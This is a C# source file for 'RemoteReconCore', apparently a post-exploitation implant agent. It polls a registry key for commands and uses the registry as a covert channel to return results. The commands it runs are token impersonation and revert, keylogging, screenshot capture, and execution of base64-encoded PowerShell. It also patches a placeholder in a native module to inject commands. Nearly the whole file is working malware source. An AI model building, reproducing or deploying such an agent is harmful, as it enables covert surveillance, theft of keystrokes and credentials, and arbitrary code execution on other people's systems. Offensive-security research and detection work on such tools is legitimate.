using System;
using System.Text;
using Microsoft.Win32;
using System.Security.Principal;
using System.Threading;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace RemoteReconCore
{
    [ComVisible(true)]
    public class Agent
    {
        public Agent()
        {

        }

        public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
        {
            //open base key
            RegistryKey hklm = Registry.LocalMachine;
            
#if DEBUG
            Console.WriteLine("Opening Remote Recon base key");
#endif
            if ((rrbase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
                System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/

            modkey = runkey;
            kkey = keylogkey;

            
            while (rrbase.GetValue(runkey) != null)
            {
                //main loop
                Thread.Sleep((sleep * 1000));
                int cmd;
                if ((cmd = (int)rrbase.GetValue(commandkey)) == 0)
                    continue; /*Continue if no cmd*/

                command = new KeyValuePair<int, object>(cmd, rrbase.GetValue(argumentkey));
                HandleCommand();

                //Post results to the appropriate key
                switch (command.Key)
                {
                    case (int)Cmd.Impersonate:
#if DEBUG
                        Console.WriteLine("Writing Impersonate command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        //rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, string>(0, "");
                        break;
                    case (int)Cmd.Screenshot:
#if DEBUG
                        Console.WriteLine("Writing Screenshot command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        if (result.Key == 0) rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
                        else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, string>(0, "");
                        break;

                    case (int)Cmd.PowerShell:
#if DEBUG
                        Console.WriteLine("Writing Powershell command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, string>(0, "");
                        break;
                    case (int)Cmd.Revert:
#if DEBUG
                        Console.WriteLine("Writing Revert command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, string>(0, "");
                        break;
                    case (int)Cmd.Keylog:
#if DEBUG
                        Console.WriteLine("Writing keylog command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, string>(0, "");
                        break;
                    default:
                        break;
                }
            }
        }

        private void HandleCommand()
        {
            //Check the command keyvalue pair for a new command.
            if ((int)Cmd.Impersonate == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Impersonate command");
#endif
                Impersonate imp = new Impersonate(Convert.ToInt32(command.Value));
                result = imp.Run();
            }
            else if ((int)Cmd.Screenshot == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Screenshot command");
#endif
                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                Screenshot shot = new Screenshot(Convert.ToInt32(command.Value));
                result = shot.Run();
            }
            else if ((int)Cmd.Keylog == command.Key)
            {
                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                //LogKeystrokes(Convert.ToInt32(command.Value));
                Keylogger logger = new Keylogger(Convert.ToInt32(command.Value));
                result = logger.Run();
            }
            else if ((int)Cmd.PowerShell == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received PowerShell command");
#endif
                string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
                PowerShell ps = new PowerShell(decoded);
                result = ps.Run();
            }
            else if ((int)Cmd.Revert == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Revert command");
#endif
                try
                {
                    context.Undo();
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Successfully reverted token."));
                    result = new KeyValuePair<int, string>(0, msg);
                }
                catch (Exception e)
                {
                    string err = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                    result = new KeyValuePair<int, string>(4, err);
                }
            }
        }

        public static int sleep = 5;
        public static WindowsImpersonationContext context = null;
        //private string exceptionInfo;
        public static byte[] mod;
        public static string modkey;
        public static string kkey;
        public static KeyValuePair<int, object> command;
        public static KeyValuePair<int, string> result;
        private bool kl = false;
        private Thread keylogThread;
        RegistryKey rrbase;

        public enum Result : int
        {
            Success = 0,
            ImpersonateFailed = 1,
            KeylogFailed = 2,
            ScreenShotFailed = 3,
            PSFailed = 4,
            RevertFailed = 5,
            AssemblyFailed = 6
        }

        public enum Cmd : int
        {
            None = 0,
            Impersonate = 1,
            Keylog = 2,
            Screenshot = 3,
            PowerShell = 4,
            Revert = 5,
            Assembly = 6
        }
        

        public static byte[] PatchRemoteReconNative(string cmd)
        {
            byte[] cmdBytes = Encoding.ASCII.GetBytes(cmd);
            byte[] modCopy = mod;
            int index = 0;
            string moduleString = Encoding.ASCII.GetString(mod);
            index = moduleString.IndexOf("Replace-Me  ");

            if(index == 0)
                return new byte[1] { 0 };

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                modCopy[index + i] = cmdBytes[i];
            }

            modCopy[index + cmdBytes.Length] = 0x00;
            modCopy[index + cmdBytes.Length + 1] = 0x00;

            return modCopy;
        }
    }
}
